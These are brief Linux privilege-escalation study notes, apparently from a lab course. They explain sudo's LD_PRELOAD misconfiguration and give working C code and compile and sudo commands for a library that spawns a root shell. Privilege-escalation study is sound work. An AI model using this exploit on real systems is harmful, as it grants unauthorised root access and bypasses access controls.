LD= dynamic linker
this means that the shared libraries are loaded first and to exploit first we have to create a custom malicious library  
How to understand the vulnerability
`env_keep=LD_PRELOAD` is enables this means it is vulnerable to LD_PREALOAD
 
![](/Linux-Privilege-Notes/images/sudo%20-l.png)

Exploitation 
create a file called shell.c
with code

" 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}


compile it the command 
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
this will generate a .so file -> shell.so (in our case )

run the file with binaries/files with have root permissions to work with 

`sudo LD_PRELOAD=/home/user/shell.so apache2`

"

![](/images/sudo%20ld_preload.png)
